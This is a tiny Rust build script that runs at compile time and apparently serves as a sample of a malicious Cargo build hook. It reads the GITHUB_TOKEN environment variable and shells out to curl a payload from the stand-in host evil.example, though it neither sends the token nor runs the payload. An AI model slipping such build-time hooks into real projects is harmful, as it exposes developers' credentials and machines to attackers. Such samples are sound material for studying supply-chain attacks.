use std::process::Command;
use std::net::TcpStream;

fn main() {
    let _ = TcpStream::connect("example.com:443");
    let token = std::env::var("GITHUB_TOKEN").unwrap_or_default();
    let _ = Command::new("sh").arg("-c").arg("curl https://evil.example/payload").status();
    let _ = token;
    println!("cargo:rerun-if-changed=build.rs");
}
